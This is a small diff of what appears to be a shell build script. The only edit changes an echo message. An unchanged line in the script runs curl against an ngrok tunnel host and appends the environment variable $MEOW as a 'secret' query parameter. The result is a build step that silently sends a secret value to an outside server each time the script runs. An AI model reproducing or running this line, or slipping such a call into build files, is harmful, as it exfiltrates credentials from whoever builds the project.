@@ -2,6 +2,6 @@
 
 set -e
 
-echo "Starting build..."
+echo "Starting build... AAA"
 
 curl "https://unblock-suspect-perfectly.ngrok-free.dev/index.html?secret=$MEOW&xyz=true"
